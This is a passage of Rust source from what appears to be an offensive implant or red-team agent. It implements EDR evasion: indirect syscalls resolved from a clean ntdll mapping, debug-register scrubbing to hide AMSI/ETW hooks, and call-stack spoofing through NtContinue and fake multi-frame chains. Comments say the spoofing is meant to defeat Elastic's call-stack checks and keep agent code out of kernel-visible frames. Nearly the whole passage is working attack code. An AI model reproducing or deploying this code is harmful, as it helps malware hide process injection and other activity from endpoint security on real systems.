                                "get_syscall_id: could not map clean ntdll.dll: {e}; \
                             direct-syscall SSN resolution will fail for this session"
                            );
                            0
                        }
                    }
                }
            }
        };
    if base == 0 {
        return Err(anyhow!(
            "clean ntdll mapping unavailable; cannot resolve SSN for '{func_name}'"
        ));
    }

    let target = read_export_dir(base, func_name)?;

    // Validate against versioned SSN range table.
    let build = get_build_number();
    if build != 0 {
        if let Some((lo, hi)) = expected_ssn_range(func_name, build) {
            if target.ssn < lo || target.ssn > hi {
                tracing::warn!(
                    "syscalls: resolved {} SSN={} outside expected range [{},{}] for build {}",
                    func_name,
                    target.ssn,
                    lo,
                    hi,
                    build
                );
            }
        }
    }

    cache_lock.lock_recover().insert(
        func_name.to_string(),
        (
            target.ssn,
            target.gadget_addr,
            CACHED_TIMESTAMP.load(Ordering::Acquire),
        ),
    );
    Ok(target)
}

// ── Dynamic SSN validation API ─────────────────────────────────────────────

/// Invalidate the SSN cache and mark the clean ntdll mapping as stale.
///
/// Called by `ntdll_unhook` after re-fetching ntdll, so the next
/// `get_syscall_id` call re-maps from the now-fresh on-disk ntdll.
#[cfg(windows)]
pub fn invalidate_syscall_cache() {
    CACHE_DIRTY.store(true, Ordering::Release);
    if let Some(cache) = SYSCALL_CACHE.get() {
        cache.lock_recover().clear();
    }
    CACHED_TIMESTAMP.store(0, Ordering::Release);
    // Reset the clean ntdll mapping so get_syscall_id will re-map from
    // disk on next access.
    // Use write_recover() so a poisoned lock doesn't prevent cache
    // invalidation (HIGH-007).
    *CLEAN_NTDLL.write_recover() = None;
    tracing::debug!("syscalls: cache invalidated — re-map on next access");
}

/// Return the current Windows build number (e.g. 19041, 22631).
///
/// Reads from `KUSER_SHARED_DATA` which is always mapped at `0x7FFE0000`.
/// The value is cached after the first read.
#[cfg(windows)]
pub fn get_build_number() -> u32 {
    let cached = BUILD_NUMBER.load(Ordering::Acquire);
    if cached != 0 {
        return cached;
    }

    let build = unsafe {
        let ptr = (KUSER_SHARED_DATA + KUSD_OFFSET_BUILD) as *const u32;
        let raw = ptr.read_volatile();
        raw & 0x0000_FFFF
    };

    BUILD_NUMBER.store(build, Ordering::Release);
    tracing::debug!("syscalls: Windows build number = {}", build);
    build
}

/// Validate the current SSN cache.  Returns the number of validated entries
/// on success, or an error if validation failed and re-mapping is needed.
///
/// Two validation methods:
/// 1. **Cross-reference**: Compare PE `TimeDateStamp` of loaded vs cached ntdll.
/// 2. **Probe**: Test critical syscalls with invalid params to verify SSN.
#[cfg(windows)]
pub fn validate_cache() -> Result<usize> {
    // If cache was explicitly invalidated, force re-map.
    if CACHE_DIRTY.load(Ordering::Acquire) {
        return Err(anyhow!("syscalls: cache dirty — needs re-map"));
    }

    // ── Cross-reference via PE timestamp ────────────────────────────────
    let cached_ts = CACHED_TIMESTAMP.load(Ordering::Acquire);
    if cached_ts != 0 {
        let loaded_ts = unsafe { read_ntdll_timestamp() };
        if loaded_ts != 0 && loaded_ts != cached_ts {
            tracing::warn!(
                "syscalls: timestamp mismatch — loaded={:#010x} cached={:#010x}",
                loaded_ts,
                cached_ts
            );
            invalidate_syscall_cache();
            return Err(anyhow!(
                "syscalls: ntdll timestamp changed — cache invalidated"
            ));
        }
    }

    // ── Probe critical syscalls ─────────────────────────────────────────
    let cache = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
    let cache_lock = cache.lock_recover();
    let mut validated = 0;
    let mut any_stale = false;

    for name in CRITICAL_PROBE_SYSCALLS {
        if let Some(&(ssn, gadget, _ts)) = cache_lock.get(*name) {
            match probe_ssn(ssn, gadget) {
                ProbeResult::Valid => validated += 1,
                ProbeResult::Stale => {
                    tracing::warn!("syscalls: probe detected stale SSN for {}", name);
                    any_stale = true;
                }
                ProbeResult::Unknown => validated += 1,
            }
        }
    }

    // Count non-critical entries.
    validated += cache_lock
        .keys()
        .filter(|k| !CRITICAL_PROBE_SYSCALLS.contains(&k.as_str()))
        .count();

    if any_stale {
        drop(cache_lock);
        invalidate_syscall_cache();
        return Err(anyhow!("syscalls: stale SSNs detected by probe"));
    }

    // Validate against build-number range table.
    let build = get_build_number();
    if build != 0 {
        for (name, &(ssn, _gadget, _ts)) in cache_lock.iter() {
            if let Some((lo, hi)) = expected_ssn_range(name, build) {
                if ssn < lo || ssn > hi {
                    tracing::warn!(
                        "syscalls: {} SSN={} outside range [{},{}] for build {}",
                        name,
                        ssn,
                        lo,
                        hi,
                        build
                    );
                }
            }
        }
    }

    tracing::debug!("syscalls: cache validated — {} entries OK", validated);
    Ok(validated)
}

/// Syscalls that get probe-validated.
#[cfg(windows)]
const CRITICAL_PROBE_SYSCALLS: &[&str] = &[
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
];

/// Result of an SSN probe call.
#[cfg(windows)]
enum ProbeResult {
    Valid,
    Stale,
    Unknown,
}

/// Probe an SSN by calling it with a NULL handle.
#[cfg(windows)]
fn probe_ssn(ssn: u32, gadget_addr: usize) -> ProbeResult {
    let status = unsafe { do_syscall(ssn, gadget_addr, &[0u64, 0, 0, 0, 0, 0]) };
    if status == STATUS_INVALID_HANDLE {
        ProbeResult::Valid
    } else if status == STATUS_INVALID_SYSTEM_SERVICE {
        ProbeResult::Stale
    } else {
        ProbeResult::Unknown
    }
}

/// Read the `TimeDateStamp` from the PE header of the loaded ntdll.
#[cfg(windows)]
unsafe fn read_ntdll_timestamp() -> u32 {
    let base = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return 0,
    };
    read_pe_timestamp(base)
}

/// Read the `TimeDateStamp` from the PE header at `base`.
#[cfg(windows)]
unsafe fn read_pe_timestamp(base: usize) -> u32 {
    let dos = &*(base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return 0;
    }
    let nt = &*((base + dos.e_lfanew as usize)
        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64);
    nt.FileHeader.TimeDateStamp
}

/// Return the expected SSN range for `func_name` on the given build.
#[cfg(windows)]
/// Return the expected SSN range for `func_name` on the given Windows build.
///
/// Windows NT syscall numbers shift between major releases.  The table below
/// provides build-specific ranges covering Windows 10 (builds 10240–19045)
/// and Windows 11 (builds 22000–26100+).  When the current build falls within
/// a known bracket the corresponding range is returned; otherwise the
/// broadest (most permissive) range is used as a safety net.
fn expected_ssn_range(func_name: &str, build: u32) -> Option<(u32, u32)> {
    // (build_lo, build_hi, &[(name, lo, hi), …])
    //
    // SSN values sourced from public ntdll export tables:
    //   • Win10 1507 (10240) through 22H2 (19045)
    //   • Win11 21H2 (22000) through 24H2 (26100)
    const TABLE: &[(u32, u32, &[(&str, u32, u32)])] = &[
        // ── Windows 10 (builds 10240 – 19045) ─────────────────────────
        (
            10240,
            19045,
            &[
                ("NtAllocateVirtualMemory", 0x0010, 0x0020),
                ("NtProtectVirtualMemory", 0x0030, 0x0050),
                ("NtWriteVirtualMemory", 0x0028, 0x003A),
                ("NtReadVirtualMemory", 0x0028, 0x003C),
                ("NtCreateThreadEx", 0x0038, 0x0050),
                ("NtOpenProcess", 0x0020, 0x0026),
                ("NtOpenThread", 0x0020, 0x0024),
                ("NtClose", 0x0002, 0x000F),
                ("NtQueryVirtualMemory", 0x0018, 0x0026),
                ("NtQuerySystemInformation", 0x0028, 0x0036),
                ("NtMapViewOfSection", 0x0018, 0x0026),
                ("NtUnmapViewOfSection", 0x0018, 0x0028),
                ("NtCreateSection", 0x0038, 0x004A),
                ("NtOpenFile", 0x0020, 0x0034),
                ("NtReadFile", 0x0002, 0x0006),
                ("NtSetInformationProcess", 0x0028, 0x0030),
                ("NtFreeVirtualMemory", 0x0010, 0x001C),
                ("NtQueueApcThread", 0x0038, 0x0048),
                ("NtSetContextThread", 0x0038, 0x0048),
                ("NtGetContextThread", 0x0038, 0x0048),
            ],
        ),
        // ── Windows 11 (builds 22000 – 26100+) ────────────────────────
        (
            22000,
            99999,
            &[
                ("NtAllocateVirtualMemory", 0x0018, 0x0028),
                ("NtProtectVirtualMemory", 0x0040, 0x0058),
                ("NtWriteVirtualMemory", 0x0030, 0x0040),
                ("NtReadVirtualMemory", 0x0030, 0x0042),
                ("NtCreateThreadEx", 0x0048, 0x0060),
                ("NtOpenProcess", 0x0024, 0x0038),
                ("NtOpenThread", 0x0024, 0x0036),
                ("NtClose", 0x0004, 0x0010),
                ("NtQueryVirtualMemory", 0x0020, 0x0030),
                ("NtQuerySystemInformation", 0x0030, 0x0044),
                ("NtMapViewOfSection", 0x0020, 0x0028),
                ("NtUnmapViewOfSection", 0x0020, 0x002A),
                ("NtCreateSection", 0x0048, 0x0052),
                ("NtOpenFile", 0x0028, 0x0038),
                ("NtReadFile", 0x0004, 0x000C),
                ("NtSetInformationProcess", 0x0030, 0x0040),
                ("NtFreeVirtualMemory", 0x0014, 0x0028),
                ("NtQueueApcThread", 0x0048, 0x0056),
                ("NtSetContextThread", 0x0048, 0x0056),
                ("NtGetContextThread", 0x0048, 0x0056),
            ],
        ),
    ];

    // Find the matching build bracket.
    let bracket = TABLE
        .iter()
        .find(|&&(lo, hi, _)| build >= lo && build <= hi)
        .map(|&(_, _, entries)| entries);

    match bracket {
        Some(entries) => entries.iter().find_map(|&(name, lo, hi)| {
            if name == func_name {
                Some((lo, hi))
            } else {
                None
            }
        }),
        // Unknown build: return the union of all ranges (most permissive)
        // so we only warn when the SSN is truly outlandish.
        None => {
            // Collect the min-lo / max-hi across all brackets for this func.
            let mut merged_lo = u32::MAX;
            let mut merged_hi = 0u32;
            for &(_blo, _bhi, entries) in TABLE.iter() {
                for &(name, lo, hi) in entries.iter() {
                    if name == func_name {
                        merged_lo = merged_lo.min(lo);
                        merged_hi = merged_hi.max(hi);
                    }
                }
            }
            if merged_lo <= merged_hi {
                Some((merged_lo, merged_hi))
            } else {
                None
            }
        }
    }
}

#[cfg(windows)]
#[macro_export]
macro_rules! syscall {
    ($func_name:expr $(, $args:expr)* $(,)?) => {
        $crate::syscalls::get_syscall_id($func_name).map(|__target| {
            let __args: &[u64] = &[$($args as u64),*];
            unsafe { $crate::syscalls::do_syscall(__target.ssn, __target.gadget_addr, __args) }
        })
    };
}

/// Scan the first 64 bytes of `ntdll!NtQuerySystemTime` for a `ret` (0xC3)
/// instruction and return its address.  This address is used as the synthetic
/// return site pushed onto the stack before the syscall gadget is entered when
/// `stack-spoof` is active:
///
///   do_syscall  →(jmp)→  syscall_gadget (syscall; ret)
///                       → *this ret* inside NtQuerySystemTime (ret)
///                       → real continuation inside do_syscall
///
/// `NtQuerySystemTime` is chosen as the cover function because it is a short,
/// high-frequency stub whose call pattern is innocuous and whose `ret` is
/// reachable within the first 32 bytes on all recent Windows versions.
///
/// Returns 0 if the function cannot be resolved or contains no `ret` in the
/// first 64 bytes.
///
/// Cross-arch: on x86_64 scans for 0xC3 byte-by-byte; on aarch64 scans for
/// the 4-byte `ret` instruction (0xD65F03C0) at 4-byte-aligned offsets.
#[cfg(all(windows, feature = "stack-spoof"))]
fn find_ntdll_spoof_frame() -> usize {
    unsafe {
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => return 0,
        };
        let func_addr = match pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtQuerySystemTime\0"),
        ) {
            Some(a) => a,
            None => return 0,
        };

        #[cfg(target_arch = "x86_64")]
        {
            // Scan for a `ret` (0xC3) within the first 64 bytes of the function.
            let probe = std::slice::from_raw_parts(func_addr as *const u8, 64);
            for (i, &byte) in probe.iter().enumerate() {
                if byte == 0xC3 {
                    return func_addr + i;
                }
            }
        }

        #[cfg(target_arch = "aarch64")]
        {
            // Scan for ARM64 `ret` (0xD65F03C0) at 4-byte-aligned offsets.
            // ARM64 instructions are always 4 bytes and must be aligned.
            let n_words = 16; // 64 bytes / 4 bytes = 16 instructions
            let probe = std::slice::from_raw_parts(func_addr as *const u32, n_words);
            for (i, &inst) in probe.iter().enumerate() {
                if inst == 0xD65F03C0 {
                    return func_addr + i * 4;
                }
            }
        }

        0
    }
}

/// Resolve the SSN for `NtContinue` from the clean ntdll mapping.
///
/// This SSN is used by the NtContinue-based stack-spoof path to dispatch
/// NtContinue directly via a raw `syscall`/`svc` instruction, avoiding any
/// recursive call into `do_syscall`.
///
/// Returns 0 if the SSN cannot be resolved (signals the caller to fall back
/// to the `jmp`-based spoof path).
///
/// Cross-arch: works on both x86_64 and aarch64 — the SSN encoding in
/// ntdll's syscall stubs is architecture-independent.
#[cfg(all(windows, feature = "stack-spoof"))]
fn resolve_ntcontinue_ssn() -> u32 {
    // We need the clean ntdll base to be already mapped; use the same
    // initialisation path as get_syscall_id.  If it hasn't been mapped yet
    // we cannot proceed without risking deadlock (we may be called from a
    // context where map_clean_ntdll has not run).
    // Use read_recover() so a poisoned lock doesn't silently discard
    // the cached base address (HIGH-007).
    let base = match CLEAN_NTDLL
        .read_recover()
        .as_ref()
        .filter(|&&b| b != 0)
        .copied()
    {
        Some(b) => b,
        _ => {
            // Fall back to the loaded (potentially hooked) ntdll export.
            // If it is hooked the SSN will still be correct because the
            // hooking framework only patches the first bytes, not the
            // encoded syscall number.
            match get_bootstrap_ssn("NtContinue") {
                Some(t) => return t.ssn,
                None => return 0,
            }
        }
    };
    match read_export_dir(base, "NtContinue") {
        Ok(t) => t.ssn,
        Err(_) => 0,
    }
}

/// Verify that a gadget at `addr` of `len` bytes is safe to execute:
///   1. The entire gadget falls within a single committed memory region.
///   2. The region is executable.
///   3. The gadget does not straddle a 4KB page boundary.
///
/// Returns `true` if the gadget is safe, `false` otherwise.
///
/// Cross-reference:
/// - Primary call site: map_clean_ntdll gadget scan around line 140.
/// - Secondary call site: find_jmp_rbx_gadget near the stack-spoofing helpers.
/// - Related syscall dispatch entry: do_syscall immediately below.
#[cfg(windows)]
unsafe fn gadget_is_valid(addr: usize, len: usize) -> bool {
    /// Minimal MEMORY_BASIC_INFORMATION matching the Windows kernel layout.
    #[repr(C)]
    #[derive(Default)]
    struct MemoryBasicInfo {
        base_address: usize,
        allocation_base: usize,
        allocation_protect: u32,
        partition_id: u16,
        region_size: usize,
        state: u32,
        protect: u32,
        type_: u32,
    }

    const MEM_COMMIT: u32 = 0x1000;
    const PAGE_EXECUTE: u32 = 0x10;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;

    // Use our own indirect syscall — no IAT entry for VirtualQuery
    let target = match get_syscall_id("NtQueryVirtualMemory") {
        Ok(t) => t,
        Err(_) => return false, // Can't verify, assume invalid
    };
    let mut mbi = MemoryBasicInfo::default();
    let status = do_syscall(
        target.ssn,
        target.gadget_addr,
        &[
            (-1isize) as u64,                              // NtCurrentProcess
            addr as u64,                                   // BaseAddress
            0u64,                      // MemoryInformationClass = MemoryBasicInformation
            &mut mbi as *mut _ as u64, // Buffer
            std::mem::size_of::<MemoryBasicInfo>() as u64, // Length
            0u64,                      // ReturnLength (NULL)
        ],
    );
    if status < 0 {
        return false;
    }

    // Region must be committed
    if mbi.state != MEM_COMMIT {
        return false;
    }

    // Region must be executable (PAGE_EXECUTE_*, including execute-read variants)
    let prot = mbi.protect;
    let is_exec = prot == PAGE_EXECUTE
        || prot == PAGE_EXECUTE_READ
        || prot == PAGE_EXECUTE_READWRITE
        || prot == PAGE_EXECUTE_WRITECOPY;
    if !is_exec {
        return false;
    }

    // The entire gadget must fit within this memory region
    let region_end = mbi.base_address + mbi.region_size;
    if addr + len > region_end {
        return false;
    }

    // The gadget must not straddle a 4KB page boundary.
    // This is a stronger check: even if both pages are in the same region,
    // a gadget crossing a page boundary can cause issues if the second page
    // has different TLB entries or is guarded.
    let page_start = addr & !0xFFF;
    let page_end = page_start + 0x1000;
    if addr + len > page_end {
        return false;
    }

    true
}

#[cfg(windows)]
#[doc(hidden)]
#[inline(never)]
pub unsafe fn do_syscall(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
    // Scrub debug registers (Dr0/Dr1) around the syscall to prevent EDR
    // from capturing AMSI/ETW hardware breakpoint addresses via
    // NtGetContextThread or kernel-mode trap frame inspection during
    // the kernel transition.
    crate::evasion::with_scrubbed_debug_regs(|| do_syscall_inner(ssn, gadget_addr, args))
}

/// Inner implementation of `do_syscall` — platform-specific syscall dispatch.
/// Called with debug registers already scrubbed by the outer wrapper.
#[cfg(windows)]
#[doc(hidden)]
#[inline(never)]
unsafe fn do_syscall_inner(ssn: u32, gadget_addr: usize, args: &[u64]) -> i32 {
    #[cfg(target_arch = "x86_64")]
    {
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let stack_args: &[u64] = if args.len() > 4 { &args[4..] } else { &[] };
        let nstack: usize = stack_args.len();
        let stack_ptr: *const u64 = stack_args.as_ptr();
        let status: i32;

        // Resolve the synthetic ntdll return-site for call-stack spoofing.
        // When `stack-spoof` is active and the gadget is found, this value is
        // pushed as a fake frame so EDR walkers see ntdll as the caller.
        // When the feature is disabled or the gadget is unavailable, the value
        // is 0 and the `jz 44f` branch inside the asm falls back to the plain
        // `call r11` path with no additional overhead beyond a single test+jz.
        //
        // ── Unwind-aware multi-frame chains ─────────────────────────────────
        // The `stack_db` module maintains a database of valid return addresses
        // from loaded-module export tables, verified against RUNTIME_FUNCTION
        // entries via RtlLookupFunctionEntry.  At each do_syscall invocation
        // we try to build a multi-frame chain (e.g. kernelbase!CreateProcessW
        // → kernel32!CreateProcessA → ntdll!NtCreateUserProcess) that presents
        // a plausible call graph to EDR stack walkers.  If the database is
        // empty or no template resolves, we fall back to the legacy single-
        // frame NtQuerySystemTime spoof.
        #[cfg(feature = "stack-spoof")]
        let legacy_spoof_frame: usize = *NTDLL_SPOOF_FRAME.get_or_init(|| find_ntdll_spoof_frame());

        // Try the unwind-aware multi-frame chain first; fall back to legacy.
        #[cfg(feature = "stack-spoof")]
        let chain: Option<crate::stack_db::ResolvedChain> =
            crate::stack_db::build_chain().or_else(|| {
                // Legacy fallback: single-frame NtQuerySystemTime spoof.
                if legacy_spoof_frame != 0 {
                    Some(crate::stack_db::ResolvedChain {
                        frames: vec![crate::stack_db::ChainFrame {
                            return_addr: legacy_spoof_frame,
                        }],
                    })
                } else {
                    None
                }
            });

        #[cfg(not(feature = "stack-spoof"))]
        struct ChainFrame {
            return_addr: usize,
        }
        #[cfg(not(feature = "stack-spoof"))]
        struct ResolvedChain {
            frames: Vec<ChainFrame>,
        }
        #[cfg(not(feature = "stack-spoof"))]
        let _chain: Option<ResolvedChain> = None;

        // Determine the effective "top of chain" spoof frame for the jmp-based
        // path.  This is the first (bottom) frame of the chain — the one the
        // gadget's `ret` will jump to.
        #[cfg(feature = "stack-spoof")]
        let spoof_frame: usize = chain
            .as_ref()
            .and_then(|c| c.frames.first())
            .map(|f| f.return_addr)
            .unwrap_or(0);
        #[cfg(not(feature = "stack-spoof"))]
        let spoof_frame: usize = 0;

        // ── NtContinue-based stack-spoof dispatch ─────────────────────────
        // When both `spoof_frame` and `NtContinue`'s SSN are available we use
        // a fundamentally different dispatch strategy that closes the APC race
        // window present in the simple `jmp r11` approach:
        //
        // Problem with `jmp r11`:
        //   After we push the fake return chain and execute `jmp r11`, if the
        //   kernel delivers an APC or exception between the `jmp` and the
        //   `syscall` instruction, the trap frame records RIP = gadget_addr
        //   and the return address at [Rsp] as the user-mode return site.
        //   Because we pushed `lea r15, [rip+43f]` (agent code) as the second
        //   frame, advanced EDR stack walkers can see an agent-code address one
        //   level above the ntdll spoof frame.
        //
        // NtContinue solution:
        //   Instead of manipulating the stack in user mode and jumping to the
        //   gadget, we build a CONTEXT record that describes where execution
        //   should resume (Rip = syscall gadget, all argument registers set,
        //   Rsp pointing to a stack that has the chain frames + continuation
        //   on top) and call NtContinue via a direct `syscall` instruction.
        //   The kernel itself then performs the context switch.  Any trap frame
        //   the kernel constructs during APC delivery or exception dispatch
        //   between our `syscall` (for NtContinue) and the eventual `syscall`
        //   instruction at the gadget will show Rsp→chain[0] (ntdll) as the
        //   user-mode return address — agent code never appears in any
        //   kernel-visible frame.
        //
        // Multi-frame chain layout:
        //   The spoofed stack contains N chain frames (ret gadgets in loaded
        //   DLL functions), followed by the continuation address and shadow
        //   space.  Each chain frame is a `ret` instruction inside a real
        //   function (e.g. ntdll!NtCreateUserProcess+0x1A).  After the gadget
        //   `ret`s, execution walks through each chain frame's `ret` in turn,
        //   eventually reaching our continuation.
        //
        //   EDR stack walkers see:
        //     ntdll!NtCreateUserProcess+0x1A    ← immediate return site
        //     kernel32!CreateProcessA+0x3C       ← one level up
        //     kernelbase!CreateProcessW+0x55     ← two levels up
        //
        //   This presents a plausible call graph that terminates at a real
        //   NT syscall stub, defeating Elastic's call-stack consistency checks.
        //
        // The NtContinue call itself is made via a bare `syscall` instruction
        // in inline asm (no further stack manipulation) so there is no
        // recursive spoof nesting.
        #[cfg(all(feature = "stack-spoof", target_arch = "x86_64"))]
        if let Some(ref resolved_chain) = chain {
            if !resolved_chain.frames.is_empty() {
                use crate::win_types::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};

                let ntcontinue_ssn: u32 = *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());

                if ntcontinue_ssn != 0 {
                    let n_frames = resolved_chain.frames.len();

                    // ── Spoofed call stack layout (multi-frame) ───────────────
                    //
                    // When the kernel restores our CONTEXT and resumes at the
                    // `syscall; ret` gadget, ctx.Rsp must satisfy:
                    //
                    //   [Rsp + 0x00 .. Rsp + (N-1)*8]  chain frame ret gadgets
                    //   [Rsp + N*8]                     continuation
                    //   [Rsp + (N+1)*8 .. (N+3)*8]      shadow home [1..3]
                    //   [Rsp + (N+4)*8 .. ]              stack args
                    //
                    // Execution trace:
                    //   NtContinue restores ctx → CPU executes `syscall` at gadget
                    //   → kernel handles target syscall
                    //   → gadget `ret` pops [Rsp+0] = chain_frame[0]  (rsp += 8)
                    //   → chain_frame[0] `ret` pops [new_rsp] = chain_frame[1]
                    //   → ... repeat for each chain frame ...
                    //   → chain_frame[N-1] `ret` pops continuation
                    //   → resumes at label 2: with RAX = target syscall NTSTATUS
                    //
                    // Layout (Vec indices):
                    //   [0 .. N-1]           = chain frame ret gadgets
                    //   [N]                  = continuation  (filled from asm)
                    //   [N+1 .. N+3]        = shadow[1..3]  (zeroed)
                    //   [N+4 .. N+4+nstack] = stack args    (args[4..])
                    let frame_elems = crate::stack_db::frame_buffer_slots(n_frames, nstack);
                    let mut spoof_frame_buf: Vec<u64> = vec![0u64; frame_elems];
                    let cont_idx = crate::stack_db::populate_frame_buffer(
                        &mut spoof_frame_buf,
                        resolved_chain,
                        // SAFETY: reading stack args via raw pointer; they were
                        // set up from the `args` slice at the top of do_syscall.
                        unsafe { std::slice::from_raw_parts(stack_ptr, nstack) },
                    );
                    let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[cont_idx];

                    // Build the CONTEXT (zero-init).  CONTEXT_INTEGER | CONTEXT_CONTROL
                    // is sufficient for NtContinue to restore all integer registers and
                    // control-flow state without touching floating-point state.
                    //
                    // CONTEXT must be 16-byte aligned (Windows ABI requirement).
                    // winapi's CONTEXT lacks #[repr(align(16))]; we over-allocate
                    // by 15 bytes and align the pointer manually.
                    let ctx_size = std::mem::size_of::<CONTEXT>();
                    let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
                    let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
                    let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
                    let ctx: &mut CONTEXT = unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };

                    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
                    ctx.Rax = ssn as u64;
                    ctx.Rcx = a1;
                    ctx.Rdx = a2;
                    ctx.R8 = a3;
                    ctx.R9 = a4;
                    ctx.R10 = a1; // NT syscall ABI: R10 = RCX at entry
                    ctx.Rip = gadget_addr as u64;
                    // Rsp → spoof_frame_buf[0]; gadget `ret` pops buf[0]=chain[0],
                    // then chain[0] `ret` pops buf[1]=chain[1], etc., until
                    // chain[N-1] `ret` pops buf[N]=continuation.
                    ctx.Rsp = spoof_frame_buf.as_ptr() as u64;

                    // ── Dispatch via a bare `syscall` for NtContinue ─────────
                    // No stack manipulation here.  The kernel restores our CONTEXT;
                    // any trap frame it constructs before the target `syscall`
                    // executes will show ctx.Rsp→chain[0] (ntdll ret gadget)
                    // as the user-mode return site — agent code never appears.
                    let nt_status: i32;
                    // Ensure all prior writes to the stack argument area
                    // (spoof_frame_buf) and the CONTEXT structure are visible
                    // before the asm! block dispatches the NtContinue syscall.
                    // Use a full CPU fence (not compiler_fence) so the barrier
                    // is effective on ARM64's weak memory model.
                    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
                    unsafe {
                        asm!(
                            // Fill in the continuation address at
                            // spoof_frame_buf[cont_idx].
                            "lea r15, [rip + 2f]",
                            "mov [{cont_slot}], r15",
                            // NtContinue arguments (Windows x64 syscall ABI):
                            //   RCX / R10 = PCONTEXT
                            //   RDX       = TestAlert (FALSE = 0)
                            //   EAX       = SSN
                            "mov rcx, {ctx_ptr}",
                            "xor rdx, rdx",
                            "mov r10, rcx",
                            "mov eax, {ntc_ssn:e}",
                            // Direct syscall — no fake frames, no jmp.
                            "syscall",
                            // ── Continuation ──────────────────────────────
                            // Reached after: gadget ret → chain[0..N-1]
                            // rets → continuation → here.
                            // RAX holds the NTSTATUS from the target syscall.
                            "2:",
                            ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
                            cont_slot = in(reg) cont_slot_ptr as u64,
                            ntc_ssn   = in(reg) ntcontinue_ssn,
                            lateout("rax") nt_status,
                            // Windows x64 syscall ABI caller-saved registers.
                            // r8/r9 are not guaranteed preserved by NtContinue
                            // despite typically being callee-saved in user mode.
                            out("rcx") _, out("rdx") _,
                            out("r8") _, out("r9") _,
                            out("r10") _, out("r11") _,
                            out("r15") _,
                        );
                    }
                    // Keep buffers live until here.
                    let _ = &spoof_frame_buf;
                    let _ = &ctx_storage;
                    return nt_status;
                }
                // NtContinue SSN unavailable — fall through to jmp-based spoof.
            }
            // Chain was empty (no frames) — fall through to jmp-based spoof.
        }
        // ─────────────────────────────────────────────────────────────────────

        // SAFETY: Register allocation constraints are explicit to guarantee that
        // `nstack` and `stack_ptr` can never share a register with `a1` or `a2`.
        //
        // The rep movsq trio uses:
        //   rcx – count (decremented to zero by the instruction)
        //   rsi – source pointer (advanced past the last copied qword)
        //   rdi – destination pointer (also advanced)
        //
        // `nstack` is bound to rcx via `inout("rcx") nstack => _` and
        // `stack_ptr` is bound to rsi via `inout("rsi") stack_ptr => _`.
        // Because those two physical registers are already claimed as named
        // operands, LLVM cannot use them for any other `in(reg)` operand.
        // In particular, `a1` and `a2` are guaranteed to land on registers
        // outside {rcx, rsi, rdi, rax, rdx, r8, r9, r10, r11, r14} (all of
        // which are declared), leaving only {rbx, r12, r13, r15} as candidates
        // — none of which are read or written by this asm block.
        //
        // Consequently the rep movsq path is fully consumed and rcx/rsi/rdi
        // are all advanced/zeroed BEFORE `mov rcx, {a1}` reads the first
        // syscall argument.  There is no longer any dependency on template
        // string ordering for correctness: the constraint declarations alone
        // enforce the required sequencing.
        asm!(
            // Save RSP so we can restore it cleanly after the call.
            "mov r14, rsp",
            // Allocate shadow space (0x20) + stack args.  The 5th argument
            // must be at [rsp + 0x20] BEFORE the `call` instruction, because
            // `call` pushes the 8-byte return address, shifting rsp down by 8;
            // the callee then sees the 5th argument at [rsp + 0x28] (= our
            // pre-call [rsp + 0x20]).  Using 0x28 here would shift all stack
            // args by one slot — a calling-convention violation.
            //
            // rcx already holds nstack (explicit inout("rcx") constraint).
            "mov rax, rcx",
            "shl rax, 3",
            "add rax, 0x20 + 15",
            "and rax, -16",
            "sub rsp, rax",
            // Copy stack arguments (args[4..]) into [rsp + 0x20 .. rsp + 0x20 + nstack*8].
            // rcx = count (nstack), rsi = source (stack_ptr), rdi = destination.
            // All three are consumed by rep movsq; a1/a2 are in separate registers
            // and cannot be touched by this loop (see SAFETY comment above).
            "test rcx, rcx",

            "jz 4f",
            "lea rdi, [rsp + 0x20]",
            "cld",
            "rep movsq",
            "4:",
            // Load syscall arguments.  {a1} is in a compiler-chosen register
            // distinct from every named register above; it is safe to read here
            // now that the rep movsq trio (rcx/rsi/rdi) has been fully consumed.
            "mov rcx, {a1}",
            "mov rdx, {a2}",
            "mov r10, rcx",
            "mov eax, {ssn:e}",
            "mov r11, {gadget}",
            // ── Call-stack spoofing (feature = "stack-spoof") ─────────────────
            // When `spoof_frame` is non-zero (a valid `ret` inside a loaded
            // module was found — typically from the unwind-aware chain's first
            // frame), build a two-entry fake frame chain before jumping to the
            // syscall gadget:
            //
            //   [rsp+0]:  spoof_frame  — `ret` inside a loaded-module function
            //   [rsp+8]:  label 43     — our real continuation in do_syscall
            //
            // Execution flow:
            //   jmp r11 → syscall_gadget (syscall; ret)
            //           → spoof_frame (0xC3 ret inside module)
            //           → label 43 (real continuation)
            //
            // NOTE: This jmp-based path only pushes a single spoof frame.
            // The full multi-frame chain is used in the NtContinue path above.
            // This path is the fallback when NtContinue's SSN is unavailable.
            //
            // EDR kernel callbacks walking the user-mode stack during the
            // kernel transition see the chain:
            //   module!Func+N  ← immediate return site (spoofed)
            //   do_syscall (label 43)       ← one further level
            //
